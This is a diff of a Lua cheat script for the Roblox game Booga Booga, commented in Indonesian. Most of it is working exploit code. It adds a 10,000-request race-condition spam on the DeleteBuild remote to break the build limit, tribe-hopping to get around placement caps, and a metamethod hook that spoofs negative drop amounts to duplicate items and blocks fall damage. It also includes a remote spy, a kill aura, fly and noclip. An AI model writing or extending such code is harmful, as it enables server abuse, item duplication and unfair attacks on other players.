             IsRelative = item.IsRelative
         })
     end
+    
     saveBaseDatabase()
     logAction("BUILDER", "Base '" .. bName .. "' successfully saved/edited in list!")
     updateBaseList()
 end)
+
 loadBaseBtn.MouseButton1Click:Connect(function()
     local success = loadBaseDatabase()
     if success then
@@ -1678,14 +1900,17 @@ loadBaseBtn.MouseButton1Click:Connect(function()
         logAction("BUILDER", "Failed to load file (PandaBooga_BasesDB.json might not exist yet).")
     end
 end)
+
 deleteBaseBtn.MouseButton1Click:Connect(function()
     if not selectedBaseName or not BaseDatabase[selectedBaseName] then
         logAction("BUILDER", "Failed: Select a base from the list first to delete!")
         return
     end
-    loadBaseDatabase()
+    
+    loadBaseDatabase() -- sinkronisasi dengan file terbaru
     BaseDatabase[selectedBaseName] = nil
     saveBaseDatabase()
+    
     logAction("BUILDER", "Base '" .. selectedBaseName .. "' successfully deleted!")
     selectedBaseName = nil
     baseDropdown.Text = "Select Base from List..."
@@ -1694,6 +1919,7 @@ deleteBaseBtn.MouseButton1Click:Connect(function()
     buildStatusLabel.Text = "0 Buildings Saved"
     updateBaseList()
 end)
+
 clearMyBuildsBtn.MouseButton1Click:Connect(function()
     local deleteEvent
     for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
@@ -1702,10 +1928,12 @@ clearMyBuildsBtn.MouseButton1Click:Connect(function()
             break
         end
     end
+    
     if not deleteEvent then
         logAction("BUILDER", "Failed! 'DeleteBuild' remote not found!")
         return
     end
+
     logAction("BUILDER", "Starting to delete your buildings...")
     local count = 0
     for _, obj in ipairs(workspace:GetDescendants()) do
@@ -1718,6 +1946,7 @@ clearMyBuildsBtn.MouseButton1Click:Connect(function()
                 elseif ownerVal:IsA("ObjectValue") and ownerVal.Value == LocalPlayer then
                     isMine = true
                 end
+                
                 if isMine then
                     coroutine.wrap(function()
                         if deleteEvent:IsA("RemoteEvent") then
@@ -1727,6 +1956,7 @@ clearMyBuildsBtn.MouseButton1Click:Connect(function()
                         end
                     end)()
                     count = count + 1
+                    -- Jangan terlalu spam sekaligus agar tidak disconnect
                     if count % 20 == 0 then wait(0.1) end
                 end
             end
@@ -1734,10 +1964,12 @@ clearMyBuildsBtn.MouseButton1Click:Connect(function()
     end
     logAction("BUILDER", "Done! " .. count .. " of your buildings have been deleted from the map.")
 end)
+
 deleteRadiusBtn.MouseButton1Click:Connect(function()
     local char = LocalPlayer.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
     if not root then return end
+
     local deleteEvent
     for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
         if desc.Name == "DeleteBuild" and (desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction")) then
@@ -1745,13 +1977,16 @@ deleteRadiusBtn.MouseButton1Click:Connect(function()
             break
         end
     end
+    
     if not deleteEvent then
         logAction("BUILDER", "Failed! 'DeleteBuild' remote not found!")
         return
     end
+
     local originPos = root.Position
     logAction("BUILDER", "Starting to process deletion for buildings in area (Radius " .. State.DeleteRadius .. ")...")
     local count = 0
+
     for _, obj in ipairs(workspace:GetDescendants()) do
         if obj:IsA("Model") then
             local ownerVal = obj:FindFirstChild("Owner") or obj:FindFirstChild("Creator") or obj:FindFirstChild("Placer")
@@ -1776,16 +2011,22 @@ deleteRadiusBtn.MouseButton1Click:Connect(function()
     end
     logAction("BUILDER", "Done! " .. count .. " buildings in area processed for deletion.")
 end)
+
 pasteBaseBtn.MouseButton1Click:Connect(function()
     if #SavedBase == 0 then
         logAction("BUILDER", "No buildings copied!")
         return
     end
+    
     local char = LocalPlayer.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
     if not root then return end
+    
+    -- Mengambil CFrame karakter utuh saat tombol paste ditekan (untuk rotasi dan posisi)
     local currentCFrame = root.CFrame
     local currentPos = root.Position
+    
+    -- Cari remote PlaceBuild sekali saja
     local placeEvent
     for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
         if desc.Name == "PlaceBuild" and (desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction")) then
@@ -1793,20 +2034,28 @@ pasteBaseBtn.MouseButton1Click:Connect(function()
             break
         end
     end
+    
     if not placeEvent then
         logAction("BUILDER", "Failed! 'PlaceBuild' remote not found!")
         return
     end
+    
     logAction("BUILDER", "Starting Paste process for " .. #SavedBase .. " buildings...")
+    
     local tribeEvents = ReplicatedStorage:FindFirstChild("TribeEvents")
     local leaveTribe = tribeEvents and tribeEvents:FindFirstChild("LeaveTribe")
     local createTribe = tribeEvents and tribeEvents:FindFirstChild("CreateTribe")
+    
     if leaveTribe and createTribe then
         logAction("BUILDER", "[INFO] Auto Tribe-Hop feature found & active!")
     end
+
+    -- Mulai proses Paste di background agar tidak hang
     coroutine.wrap(function()
         local count = 0
+        
         for _, data in ipairs(SavedBase) do
+            -- TRIBE HOPPING: Reset Limit sebelum menyentuh 1200
             if count > 0 and count % 1155 == 0 and leaveTribe and createTribe then
                 logAction("BUILDER", "Limit almost full (1150). Executing Auto Tribe-Hop...")
                 leaveTribe:FireServer()
@@ -1815,26 +2064,36 @@ pasteBaseBtn.MouseButton1Click:Connect(function()
                 wait(0.5)
                 logAction("BUILDER", "Limit successfully reset! Continuing building...")
             end
+
+            -- Menentukan target posisi dan rotasi
             local targetCFrame
             if data.IsRelative then
+                -- Sistem Baru: Mengikuti arah hadap (rotasi) karakter
                 local relativeBaseCFrame = CFrame.new(data.Offset) * data.Rotation
                 targetCFrame = currentCFrame * relativeBaseCFrame
+                -- Tambah offset Y sesuai setingan di UI
                 targetCFrame = targetCFrame + Vector3.new(0, State.PasteHeight, 0)
             else
+                -- Sistem Lama (Backward Compatibility): Tetap menghadap arah asli dunia
                 local targetPos = currentPos + Vector3.new(0, State.PasteHeight, 0) + data.Offset
                 targetCFrame = CFrame.new(targetPos) * data.Rotation
             end
+            
             if placeEvent:IsA("RemoteEvent") then
                 placeEvent:FireServer(data.Name, targetCFrame)
             else
                 placeEvent:InvokeServer(data.Name, targetCFrame)
             end
+            
             count = count + 1
-            wait(State.AttackCooldown > 0 and State.AttackCooldown or 0.1)
+            wait(State.AttackCooldown > 0 and State.AttackCooldown or 0.1) -- Jeda kecepatan naruh barang ngikutin setingan AttackCooldown
         end
+        
         logAction("BUILDER", "Successfully built Skybase with " .. count .. " buildings (Limit By-passed)!")
     end)()
 end)
+
+-- TOMBOL DUPE LIMIT (GLITCH SERVER)
 local dupeLimitBtn = Instance.new("TextButton")
 dupeLimitBtn.Size = UDim2.new(0.9, 0, 0, 35)
 dupeLimitBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
@@ -1844,6 +2103,7 @@ dupeLimitBtn.TextSize = 13
 dupeLimitBtn.Text = "GLITCH / DUPE LIMIT (-3000)"
 dupeLimitBtn.LayoutOrder = 5
 dupeLimitBtn.Parent = builderTab
+
 dupeLimitBtn.MouseButton1Click:Connect(function()
     local deleteEvent
     for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
@@ -1852,10 +2112,13 @@ dupeLimitBtn.MouseButton1Click:Connect(function()
             break
         end
     end
+    
     if not deleteEvent then
         logAction("BUILDER", "Failed! 'DeleteBuild' remote not found!")
         return
     end
+
+    -- Cari SEMBARANG bangunan yang ada di map untuk dikorbankan sebagai tumbal spam
     local tumbalObj = nil
     for _, obj in ipairs(workspace:GetDescendants()) do
         if obj:IsA("Model") and (obj.Name == "Wood Wall" or obj.Name == "Stone Wall" or obj:FindFirstChild("Owner") or obj:FindFirstChild("Creator")) then
@@ -1863,11 +2126,15 @@ dupeLimitBtn.MouseButton1Click:Connect(function()
             break
         end
     end
+
     if not tumbalObj then
         logAction("BUILDER", "Failed! You need at least 1 building (Wood Wall) on the ground as a sacrifice.")
         return
     end
+
     logAction("BUILDER", "Executing EXTREME SPAM on DeleteBuild (Bypassing Limit)...")
+    
+    -- Eksekusi bom 10000 sinyal bersamaan TANPA JEDA (Race Condition)
     for i = 1, 10000 do
         coroutine.wrap(function()
             if deleteEvent:IsA("RemoteEvent") then
@@ -1877,171 +2144,28 @@ dupeLimitBtn.MouseButton1Click:Connect(function()
             end
         end)()
     end
+    
     logAction("BUILDER", "10000 requests attack finished! Your limit is now drastically Minus/Infinite!")
 end)
-createInfoBox("Auto Gift", "Drops the intercepted item at -10 studs below selected players. Drop an item while this is ON to capture it.", 1, giftTab)
-local autoGiftBtn = Instance.new("TextButton")
-autoGiftBtn.Size = UDim2.new(0.9, 0, 0, 35)
-autoGiftBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
-autoGiftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-autoGiftBtn.Font = Enum.Font.GothamBold
-autoGiftBtn.TextSize = 13
-autoGiftBtn.Text = "Auto Gift: OFF"
-autoGiftBtn.LayoutOrder = 2
-autoGiftBtn.Parent = giftTab
-local giftStatus = Instance.new("TextLabel")
-giftStatus.Name = "GiftStatusLabel"
-giftStatus.Size = UDim2.new(0.9, 0, 0, 30)
-giftStatus.BackgroundTransparency = 1
-giftStatus.Text = "Status: Drop an item to capture..."
-giftStatus.TextColor3 = Color3.fromRGB(241, 196, 15)
-giftStatus.Font = Enum.Font.GothamBold
-giftStatus.TextSize = 12
-giftStatus.LayoutOrder = 3
-giftStatus.Parent = giftTab
-local refreshGiftBtn = Instance.new("TextButton")
-refreshGiftBtn.Size = UDim2.new(0.9, 0, 0, 30)
-refreshGiftBtn.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
-refreshGiftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-refreshGiftBtn.Font = Enum.Font.GothamBold
-refreshGiftBtn.TextSize = 12
-refreshGiftBtn.Text = "Refresh Player List"
-refreshGiftBtn.LayoutOrder = 4
-refreshGiftBtn.Parent = giftTab
-local btnContainer = Instance.new("Frame")
-btnContainer.Size = UDim2.new(0.9, 0, 0, 30)
-btnContainer.BackgroundTransparency = 1
-btnContainer.LayoutOrder = 5
-btnContainer.Parent = giftTab
-local selectAllGiftBtn = Instance.new("TextButton")
-selectAllGiftBtn.Size = UDim2.new(0.48, 0, 1, 0)
-selectAllGiftBtn.Position = UDim2.new(0, 0, 0, 0)
-selectAllGiftBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-selectAllGiftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-selectAllGiftBtn.Font = Enum.Font.GothamBold
-selectAllGiftBtn.TextSize = 12
-selectAllGiftBtn.Text = "Select All"
-selectAllGiftBtn.Parent = btnContainer
-local deselectAllGiftBtn = Instance.new("TextButton")
-deselectAllGiftBtn.Size = UDim2.new(0.48, 0, 1, 0)
-deselectAllGiftBtn.Position = UDim2.new(0.52, 0, 0, 0)
-deselectAllGiftBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
-deselectAllGiftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-deselectAllGiftBtn.Font = Enum.Font.GothamBold
-deselectAllGiftBtn.TextSize = 12
-deselectAllGiftBtn.Text = "Deselect All"
-deselectAllGiftBtn.Parent = btnContainer
-local giftPlayerList = Instance.new("ScrollingFrame")
-giftPlayerList.Size = UDim2.new(0.9, 0, 0, 200)
-giftPlayerList.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-giftPlayerList.BorderSizePixel = 0
-giftPlayerList.ScrollBarThickness = 4
-giftPlayerList.LayoutOrder = 6
-giftPlayerList.Parent = giftTab
-local giftPlayerLayout = Instance.new("UIListLayout")
-giftPlayerLayout.Parent = giftPlayerList
-giftPlayerLayout.SortOrder = Enum.SortOrder.Name
-local function populateGiftList()
-    for _, child in ipairs(giftPlayerList:GetChildren()) do
-        if child:IsA("TextButton") then child:Destroy() end
-    end
-    local ySize = 0
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            local btn = Instance.new("TextButton")
-            btn.Size = UDim2.new(1, 0, 0, 25)
-            local isSelected = State.GiftTargets[player.Name] or false
-            btn.BackgroundColor3 = isSelected and Color3.fromRGB(46, 204, 113) or Color3.fromRGB(60, 60, 60)
-            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            btn.Font = Enum.Font.Gotham
-            btn.TextSize = 12
-            btn.Text = player.Name
-            btn.Parent = giftPlayerList
-            btn.MouseButton1Click:Connect(function()
-                State.GiftTargets[player.Name] = not State.GiftTargets[player.Name]
-                btn.BackgroundColor3 = State.GiftTargets[player.Name] and Color3.fromRGB(46, 204, 113) or Color3.fromRGB(60, 60, 60)
-            end)
-            ySize = ySize + 25
-        end
-    end
-    giftPlayerList.CanvasSize = UDim2.new(0, 0, 0, ySize)
-end
-refreshGiftBtn.MouseButton1Click:Connect(populateGiftList)
-selectAllGiftBtn.MouseButton1Click:Connect(function()
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then State.GiftTargets[player.Name] = true end
-    end
-    populateGiftList()
-end)
-deselectAllGiftBtn.MouseButton1Click:Connect(function()
-    State.GiftTargets = {}
-    populateGiftList()
-end)
-populateGiftList()
-local autoGiftThread = nil
-local function autoGiftLoop()
-    while State.AutoGift do
-        wait(0.5)
-        if State.GiftRemote and State.GiftArgs then
-            for targetName, isSelected in pairs(State.GiftTargets) do
-                if isSelected then
-                    local targetPlayer = Players:FindFirstChild(targetName)
-                    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                        local targetPos = targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, -10, 0)
-                        local newArgs = {}
-                        local foundPos = false
-                        for i, v in ipairs(State.GiftArgs) do
-                            if typeof(v) == "CFrame" then
-                                newArgs[i] = CFrame.new(targetPos)
-                                foundPos = true
-                            elseif typeof(v) == "Vector3" then
-                                newArgs[i] = targetPos
-                                foundPos = true
-                            else
-                                newArgs[i] = v
-                            end
-                        end
-                        if not foundPos then
-                            table.insert(newArgs, CFrame.new(targetPos))
-                        end
-                        pcall(function()
-                            State.IsLoopDropping = true
-                            State.GiftRemote:FireServer(unpack(newArgs))
-                            State.IsLoopDropping = false
-                        end)
-                    end
-                end
-            end
-        end
-    end
-end
-autoGiftBtn.MouseButton1Click:Connect(function()
-    State.AutoGift = not State.AutoGift
-    if State.AutoGift then
-        autoGiftBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-        autoGiftBtn.Text = "Auto Gift: ON"
-        logAction("FEATURE", "Auto Gift Enabled")
-        if not autoGiftThread or coroutine.status(autoGiftThread) == "dead" then
-            autoGiftThread = coroutine.create(autoGiftLoop)
-            coroutine.resume(autoGiftThread)
-        end
-    else
-        autoGiftBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
-        autoGiftBtn.Text = "Auto Gift: OFF"
-        logAction("FEATURE", "Auto Gift Disabled")
-    end
-end)
+
+--------------------------------------------------------------------------------
+-- SISTEM DRAG GUI
+--------------------------------------------------------------------------------
 local UserInputService = game:GetService("UserInputService")
 local dragging, dragInput, dragStart, startPos
+
 local function update(input)
     local delta = input.Position - dragStart
     frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 end
+
 frame.InputBegan:Connect(function(input)
+    -- Memulai drag hanya saat di-klik/sentuh pada area yang tidak menutupi tombol
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         dragging = true
         dragStart = input.Position
         startPos = frame.Position
+        
         input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
                 dragging = false
@@ -2049,30 +2173,42 @@ frame.InputBegan:Connect(function(input)
         end)
     end
 end)
+
 frame.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
         dragInput = input
     end
 end)
+
 UserInputService.InputChanged:Connect(function(input)
     if input == dragInput and dragging then
         update(input)
     end
 end)
+
+--------------------------------------------------------------------------------
+-- SISTEM AURA & COLLECT
+--------------------------------------------------------------------------------
 local HARVEST_PART_NAMES = {
     ["Hit"]=true, ["Trunk"]=true, ["TreeHingePart"]=true, ["Log"]=true, ["Soil"]=true, ["Bush"]=true,
-    ["Wood"]=true, ["Stone"]=true, ["Fiber"]=true, ["Corn"]=true, ["Berries"]=true, ["Well"]=true,
+    ["Wood"]=true, ["Stone"]=true, ["Fiber"]=true, ["Corn"]=true, ["Berries"]=true, ["Well"]=true, 
     ["Spring"]=true, ["Grill"]=true, ["Bed"]=true, ["Door"]=true, ["Forge"]=true, ["Cook Raw Meat"]=true, ["Save"]=true,
     ["Rock"]=true, ["Iron"]=true, ["Gold"]=true, ["Leaves"]=true, ["Raw Meat"]=true, ["Cooked Meat"]=true, ["Plant"]=true
 }
+
 local KILL_PART_NAMES = {
     ["Head"]=true, ["Torso"]=true, ["UpperTorso"]=true, ["LowerTorso"]=true, ["HumanoidRootPart"]=true,
     ["Right Arm"]=true, ["Left Arm"]=true, ["Right Leg"]=true, ["Left Leg"]=true,
     ["RightHand"]=true, ["LeftHand"]=true, ["RightFoot"]=true, ["LeftFoot"]=true, ["RightLowerArm"]=true, ["LeftLowerArm"]=true, ["RightUpperArm"]=true, ["LeftUpperArm"]=true, ["RightLowerLeg"]=true, ["LeftLowerLeg"]=true, ["RightUpperLeg"]=true, ["LeftUpperLeg"]=true
 }
+
 local lastAttackTime = 0
 local lastLogTime = 0
+
+-- Cache pintar untuk semua objek yang bisa diklik (0 LAG)
 local cachedPrompts = {}
+
+-- Pencarian awal dilakukan di background agar tidak membuat game freeze/crash saat script di-load
 coroutine.wrap(function()
     local count = 0
     for _, obj in ipairs(workspace:GetDescendants()) do
@@ -2081,10 +2217,11 @@ coroutine.wrap(function()
         end
         count = count + 1
         if count % 1000 == 0 then
-            wait()
+            wait() -- Mencegah script timeout pada map Booga Booga yang sangat besar
         end
     end
 end)()
+-- Otomatis tambah/hapus jika ada objek baru yang muncul di game
 track(workspace.DescendantAdded:Connect(function(obj)
     if obj:IsA("ProximityPrompt") or obj:IsA("ClickDetector") then
         cachedPrompts[obj] = true
@@ -2095,6 +2232,7 @@ track(workspace.DescendantRemoving:Connect(function(obj)
         cachedPrompts[obj] = nil
     end
 end))
+
 local function getNearbyPrompts(rootPos)
     local nearby = {}
     for obj, _ in pairs(cachedPrompts) do
@@ -2108,6 +2246,7 @@ local function getNearbyPrompts(rootPos)
             elseif p:IsA("Attachment") then
                 pos = p.WorldPosition
             end
+            
             if pos and (pos - rootPos).Magnitude <= State.AuraRadius then
                 table.insert(nearby, obj)
             end
@@ -2115,23 +2254,28 @@ local function getNearbyPrompts(rootPos)
     end
     return nearby
 end
+
 local function getEquippedWeapon()
     if not LocalPlayer.Character then return nil end
     local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
     if tool and tool:FindFirstChild("Handle") then return tool end
     return nil
 end
+
 local function getTargetsInRadius()
     local targetParts = {}
     local char = LocalPlayer.Character
     if not char or not char:FindFirstChild("HumanoidRootPart") then return targetParts end
     local rootPart = char.HumanoidRootPart
+
+    -- Cek Pemain & NPC
     if State.AuraKill then
         for _, player in ipairs(Players:GetPlayers()) do
             if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                 local hum = player.Character:FindFirstChildOfClass("Humanoid")
                 if hum and hum.Health > 0 then
                     if (rootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude <= State.AuraRadius then
+                        -- Ambil beberapa part penting dari pemain (R6 dan R15)
                         local partsToHit = {"Torso", "UpperTorso", "Head", "Right Arm"}
                         for _, pName in ipairs(partsToHit) do
                             local p = player.Character:FindFirstChild(pName)
@@ -2142,68 +2286,82 @@ local function getTargetsInRadius()
             end
         end
     end
-    local parts = {}
-    pcall(function()
-        local p = OverlapParams.new()
-        p.FilterDescendantsInstances = {char}
-        p.FilterType = Enum.RaycastFilterType.Exclude
-        parts = workspace:GetPartBoundsInRadius(rootPart.Position, State.AuraRadius, p)
-    end)
-    if #parts == 0 then
-        for _, d in ipairs(workspace:GetDescendants()) do
-            local bp = d:IsA("BasePart") and d or nil
-            if bp and (bp.Position - rootPart.Position).Magnitude <= State.AuraRadius then
-                table.insert(parts, bp)
-            end
-        end
-    end
+    
+    -- Cek Objek / Resource / ProximityPrompt
+    local params = OverlapParams.new()
+    params.FilterDescendantsInstances = {char}
+    params.FilterType = Enum.RaycastFilterType.Exclude
+
+    local parts = workspace:GetPartBoundsInRadius(rootPart.Position, State.AuraRadius, params)
     for _, part in ipairs(parts) do
         local isTarget = false
+        
         if State.AuraHarvest then
             if HARVEST_PART_NAMES[part.Name] or (part.Parent and HARVEST_PART_NAMES[part.Parent.Name]) then
                 table.insert(targetParts, {part = part, type = "Harvest"})
                 isTarget = true
             end
+            -- Deteksi jika itu adalah Tool yang jatuh (Handle) untuk dipanen
             if not isTarget and part.Name == "Handle" and part.Parent:IsA("Tool") then
                 table.insert(targetParts, {part = part, type = "Harvest"})
                 isTarget = true
             end
         end
+        
         if not isTarget and State.AuraKill then
             if KILL_PART_NAMES[part.Name] or (part.Parent and KILL_PART_NAMES[part.Parent.Name]) then
                 table.insert(targetParts, {part = part, type = "Kill"})
             end
         end
     end
+
     return targetParts
 end
+
+--------------------------------------------------------------------------------
+-- MAIN LOOP EKSKUSI SEMUA FITUR
+--------------------------------------------------------------------------------
 logAction("SYSTEM", "All-In-One Hub successfully launched!")
+
 track(RunService.RenderStepped:Connect(function()
     processLogQueue()
     local currentTime = tick()
+    
+    -- 1. AURA & COLLECT
     if (State.AuraHarvest or State.AuraKill) and (currentTime - lastAttackTime >= State.AttackCooldown) then
         local weapon = getEquippedWeapon()
         local rootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
         local weaponHandle = weapon and weapon:FindFirstChild("Handle")
+        
         local targets = getTargetsInRadius()
         local hitCount = 0
+        
         for _, t in ipairs(targets) do
             local tPart = t.part
             local tType = t.type
+            
+            -- Sentuh dengan senjata (Damage)
             if weaponHandle and firetouchinterest then
                 firetouchinterest(tPart, weaponHandle, 0)
                 firetouchinterest(tPart, weaponHandle, 1)
             end
+            
+            -- Sentuh dengan badan (Collect drop items) HANYA untuk Harvest
             if tType == "Harvest" and rootPart and firetouchinterest then
                 firetouchinterest(tPart, rootPart, 0)
                 firetouchinterest(tPart, rootPart, 1)
             end
+            
             hitCount = hitCount + 1
         end
+        
+        -- Trigger Attack Remote bawaan Tool jika ada (Cukup 1x per siklus, JANGAN di-spam)
         if hitCount > 0 and weapon then
             local atkEvt = weapon:FindFirstChild("AttackEvent")
             if atkEvt and atkEvt:IsA("RemoteEvent") then atkEvt:FireServer() end
         end
+        
+        -- Eksekusi SEMUA ProximityPrompt & ClickDetector di radius (HANYA untuk Harvest)
         if State.AuraHarvest and rootPart then
             local nearbyPrompts = getNearbyPrompts(rootPart.Position)
             for _, promptObj in ipairs(nearbyPrompts) do
@@ -2216,20 +2374,27 @@ track(RunService.RenderStepped:Connect(function()
                 end
             end
         end
+        
         if hitCount > 0 and (currentTime - lastLogTime > 4) then
             logAction("AURA", "Successfully executed " .. hitCount .. " objects from a distance!")
             lastLogTime = currentTime
         end
+        
         lastAttackTime = currentTime
     end
+    
+    -- 2. AUTO CLAIM REWARD
     if State.AutoClaimReward then
         local claim = ReplicatedStorage:FindFirstChild("ClaimReward")
         if claim and claim:IsA("RemoteEvent") then
+            -- Hindari spam terlalu gila, gunakan probabilitas kecil tiap frame atau timer
             if math.random(1, 60) == 1 then
                 claim:FireServer()
             end
         end
     end
+    
+    -- 3. AUTO RESPAWN
     if State.AutoRespawn then
         local char = LocalPlayer.Character
         local hum = char and char:FindFirstChildOfClass("Humanoid")
@@ -2241,11 +2406,15 @@ track(RunService.RenderStepped:Connect(function()
         end
     end
 end))
+
+-- 4. NOCLIP & FLY
 local bbg, bve
 local wasNoclipping = false
+
 track(RunService.Stepped:Connect(function()
     local char = LocalPlayer.Character
     if char then
+        -- Noclip
         if State.Noclip or State.Fly then
             wasNoclipping = true
             for _, part in ipairs(char:GetDescendants()) do
@@ -2255,6 +2424,7 @@ track(RunService.Stepped:Connect(function()
             end
         elseif wasNoclipping then
             wasNoclipping = false
+            -- Kembalikan tabrakan (collision) ke bagian tubuh utama agar tidak nembus lagi
             local mainParts = {"Head", "Torso", "HumanoidRootPart", "UpperTorso", "LowerTorso"}
             for _, name in ipairs(mainParts) do
                 local p = char:FindFirstChild(name)
@@ -2265,6 +2435,7 @@ track(RunService.Stepped:Connect(function()
         end
     end
 end))
+
 local camera = workspace.CurrentCamera
 local getMoveVector
 pcall(function()
@@ -2274,6 +2445,7 @@ pcall(function()
         return controls:GetMoveVector()
     end
 end)
+
 if not getMoveVector then
     local control = {w=0, a=0, s=0, d=0}
     track(UserInputService.InputBegan:Connect(function(input, gp)
@@ -2295,12 +2467,14 @@ if not getMoveVector then
         return Vector3.new(control.d + control.a, 0, -(control.w + control.s))
     end
 end
+
 local fakeFloor = nil
 track(RunService.RenderStepped:Connect(function()
     local char = LocalPlayer.Character
     if char then
         local root = char:FindFirstChild("HumanoidRootPart")
         local hum = char:FindFirstChild("Humanoid")
+        
         if State.Fly and root and hum then
             if not fakeFloor then
                 fakeFloor = Instance.new("Part")
@@ -2322,15 +2496,22 @@ track(RunService.RenderStepped:Connect(function()
                 bve.maxForce = Vector3.new(9e9, 9e9, 9e9)
                 bve.Parent = root
             end
+            
             hum.PlatformStand = false
+            
+            -- Pasang lantai di bawah kaki agar animasi jalan/idle tetap berjalan
             fakeFloor.CFrame = root.CFrame - Vector3.new(0, 3.2, 0)
+            
+            -- Arahkan badan karakter mengikuti kamera secara horizontal (agar tidak nungging)
             local look = camera.CFrame.LookVector
             bbg.cframe = CFrame.new(root.Position, root.Position + Vector3.new(look.X, 0, look.Z))
+            
             local moveVec = getMoveVector()
             local dir = camera.CFrame.LookVector * -moveVec.Z + camera.CFrame.RightVector * moveVec.X
             if dir.Magnitude > 0 then
                 dir = dir.Unit
             end
+            
             bve.velocity = dir * State.FlySpeed
         else
             if fakeFloor then fakeFloor:Destroy(); fakeFloor = nil end
@@ -2342,40 +2523,39 @@ track(RunService.RenderStepped:Connect(function()
         end
     end
 end))
-local fallDamageEvent = ReplicatedStorage:FindFirstChild("GUIs")
-    and ReplicatedStorage.GUIs:FindFirstChild("Vitals")
+
+-- 5. UNIVERSAL NAMECALL HOOK (Anti Fall Damage & Spy Trace)
+-- Game ini menggunakan ReplicatedStorage.GUIs.Vitals.FallDamageEvent
+local fallDamageEvent = ReplicatedStorage:FindFirstChild("GUIs") 
+    and ReplicatedStorage.GUIs:FindFirstChild("Vitals") 
     and ReplicatedStorage.GUIs.Vitals:FindFirstChild("FallDamageEvent")
+
 local oldNamecall
 oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
     local method = getnamecallmethod()
     local args = {...}
+    
+    -- Blokir Fall Damage jika aktif
     if State.AntiFallDamage and method == "FireServer" and self == fallDamageEvent then
         return
     end
+    
+    -- Infinite Drop / Duplication Exploit (Spoofing Drop Amount)
     if State.InfiniteDrop and method == "FireServer" and (self.Name == "Drop" or self.Name == "DropItem" or self.Name == "DropItems") then
         for i, v in ipairs(args) do
             if type(v) == "number" then
-                args[i] = -999999
+                args[i] = -999999 -- Underflow hack: Coba tipu server bahwa kita nge-drop minus
             end
         end
         return oldNamecall(self, unpack(args))
     end
-    if State.AutoGift and not State.IsLoopDropping and method == "FireServer" and (self.Name == "Drop" or self.Name == "DropItem" or self.Name == "DropItems") then
-        State.GiftRemote = self
-        State.GiftArgs = args
-        for _, obj in ipairs(giftTab:GetChildren()) do
-            if obj:IsA("TextLabel") and obj.Name == "GiftStatusLabel" then
-                local itemName = tostring(args[1] or "Unknown")
-                obj.Text = "Status: Captured [" .. itemName .. "]!"
-                obj.TextColor3 = Color3.fromRGB(46, 204, 113)
-            end
-        end
-        return
-    end
+    
+    -- Sistem Trace & Logging
     if State.SpyTrace and (method == "FireServer" or method == "InvokeServer") then
         if self.Name ~= "Sync" and self.Name ~= "RequestSync" and self.Name ~= "Update" and self.Name ~= "Mouse" and self.Name ~= "Ping" then
             local argsStr = ""
             for i, v in ipairs(args) do
+                -- Tangkap tipe data asli (berguna untuk melihat CFrame/Vector3/String)
                 local vStr = type(v) == "userdata" and typeof(v) .. "(" .. tostring(v) .. ")" or tostring(v)
                 argsStr = argsStr .. vStr .. (i < #args and ", " or "")
             end
@@ -2383,12 +2563,17 @@ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
             logAction("SPY-REMOTE", string.format("%s | Args: [%s]", self.Name, argsStr))
         end
     end
+    
     return oldNamecall(self, unpack(args))
 end)
+
 local oldIndex
 oldIndex = hookmetamethod(game, "__index", function(self, key)
+    -- Jika di masa depan ada manipulasi Index lainnya bisa ditambah di sini
     return oldIndex(self, key)
 end)
+
+-- 6. EQUIP TOOL TRACKER
 local function setupCharacterTracker(char)
     char.ChildAdded:Connect(function(child)
         if State.SpyTrace and child:IsA("Tool") then
@@ -2397,13 +2582,15 @@ local function setupCharacterTracker(char)
             if durability then
                 durStr = tostring(durability.Value)
                 if durability:IsA("NumberValue") or durability:IsA("IntValue") then
-                    durStr = durStr .. "%"
+                    durStr = durStr .. "%" -- Asumsi persen atau angka solid
                 end
             end
             logAction("SPY-ITEM", string.format("Memegang: %s | Sisa/Durability: %s", child.Name, durStr))
         end
     end)
 end
+
 if LocalPlayer.Character then setupCharacterTracker(LocalPlayer.Character) end
 track(LocalPlayer.CharacterAdded:Connect(setupCharacterTracker))
+
 logAction("SYSTEM", "Universal Hook & Tracker diaktifkan!")
